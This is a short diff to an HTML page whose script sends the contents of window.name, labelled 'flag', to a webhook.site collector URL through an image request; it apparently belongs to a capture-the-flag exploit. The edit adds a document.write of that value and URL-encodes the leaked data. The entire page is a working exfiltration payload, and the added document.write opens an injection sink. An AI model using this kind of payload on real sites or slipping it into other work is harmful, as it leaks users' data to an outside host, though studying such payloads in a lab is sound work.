@@ -1,7 +1,8 @@
 <html>
 <body>
 <script>
-new Image().src='https://webhook.site/95060282-512e-44c3-ae8c-5119dd69b125?flag='+window.name;
+document.write(window.name);
+new Image().src='https://webhook.site/95060282-512e-44c3-ae8c-5119dd69b125?flag='+encodeURIComponent(window.name);
 </script>
 </body>
 </html>
